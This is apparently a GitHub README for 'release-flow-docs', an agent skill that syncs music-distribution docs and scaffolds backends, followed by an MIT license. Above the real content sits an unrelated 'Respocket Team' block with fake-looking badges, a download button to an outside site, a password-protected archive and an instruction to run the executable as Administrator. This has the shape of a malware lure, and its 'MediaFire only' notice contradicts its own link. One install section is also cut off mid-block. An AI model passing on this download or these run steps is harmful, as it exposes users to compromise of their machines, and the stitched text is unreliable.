<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# release-flow-docs

Agent skill / plugin for **music / release-distribution** products:

1. **Docs sync** — keep documentation truthful against the live  
   **User → Release → Moderation → Admin → Release (delivery)** path.
2. **Backend scaffold** — generate a local API skeleton for stages **S1–S6** with user-chosen framework (Adonis \| Nest), database (MariaDB 11 \| PostgreSQL), and file storage (local \| S3-compatible).

The skill is **adaptive**: it discovers each repository’s layout. WE.DROP / dealmedia is a **depth exemplar** only (`skills/release-flow-docs/references/exemplar-wedrop.md`) — never copy its fees, ISRC prefixes, payment providers, or hostnames into another product.

## Install

### A. Bare skill (any Agent Skills host)

Works with ZCode, Claude Code, Cursor, Codex, OpenCode, and similar clients that scan `~/.agents/skills/`:

```bash
### B. Claude Code — plugin marketplace

This repo is a Claude Code plugin marketplace (`.claude-plugin/marketplace.json`).

```text
/plugin marketplace add devochkaskustikom/release-flow-docs
/plugin install release-flow-docs@release-flow-docs
```

Then mention `/release-flow-docs` or ask for release-flow docs sync / distributor API scaffold.

### C. ZCode — Personal Plugin Marketplace

1. Clone the repo somewhere stable, e.g. `~/plugins/release-flow-docs`.
2. Open **Plugin Marketplace → Add → Add Plugin Marketplace**.
3. Paste the **repo root** (the folder that contains `marketplace.json`).
4. Open **Personal → release-flow-docs → Release Flow Docs → Install**.
5. New task → pick the skill in the composer / `/` Skills menu.

Manifest: `.zcode-plugin/plugin.json` (`skills: ./skills`). Root `marketplace.json` is the ZCode catalog; Claude’s catalog lives under `.claude-plugin/marketplace.json`.

## When it triggers

Load via `/release-flow-docs` or natural language, for example:

- «дока устарела», «синхронизируй спеки», «карта релиза», RELEASE_FLOW
- «собери локально backend для музыкального дистрибьютора»
- «scaffold api: nest + postgres + s3»

## Modes

| Mode | Behavior |
|------|----------|
| **Guidance** | Answer from flow SSOT + `path:line`. No mass edits. |
| **Targeted sync** | Edit named docs (+ flow SSOT if stages change). |
| **Full sync** | **CreateWorkflow** (load `dynamic-workflows` first) — see `references/workflow-contract.md`. |
| **Scaffold backend** | Ask stack + target dir → orchestrator + framework/DB/storage workers — see `references/scaffold-backend.md`. |

## Layout

```text
release-flow-docs/                    # git / plugin / marketplace root
├── README.md
├── LICENSE
├── marketplace.json                  # ZCode Personal market catalog
├── .claude-plugin/
│   ├── plugin.json                   # Claude Code plugin manifest
│   └── marketplace.json              # Claude Code marketplace catalog
├── .zcode-plugin/
│   └── plugin.json                   # ZCode plugin manifest
└── skills/
    └── release-flow-docs/            # Agent Skill (SKILL.md + refs)
        ├── SKILL.md
        ├── references/
        │   ├── discovery.md
        │   ├── flow-map.md
        │   ├── doc-inventory.md
        │   ├── workflow-contract.md
        │   ├── scaffold-backend.md
        │   └── exemplar-wedrop.md
        └── assets/
            ├── finding-example.md
            └── scaffold-brief-example.md
```

## Requirements

- An agent host that loads skills from `.agents/skills/` / plugin skill roots (e.g. ZCode, Claude Code).
- Full docs sync: `dynamic-workflows` (or equivalent CreateWorkflow) available.
- Scaffold: Agent tool + `AskUserQuestion` for stack choices.

## Non-negotiables (summary)

- Code is authority when syncing docs (unless the user is changing product rules).
- Discover before prescribing; map stages S1–S10 or mark `absent`.
- Do not invent Agent-only fan-out when the user asked for a workflow on a full docs pass.
- Do not paste exemplar-specific money / ISRC / hostname facts into foreign repos.
- Do not commit, migrate production, or deploy unless the user explicitly asks for local migrate as part of scaffold.


---

MIT License

Copyright (c) 2026 release-flow-docs contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
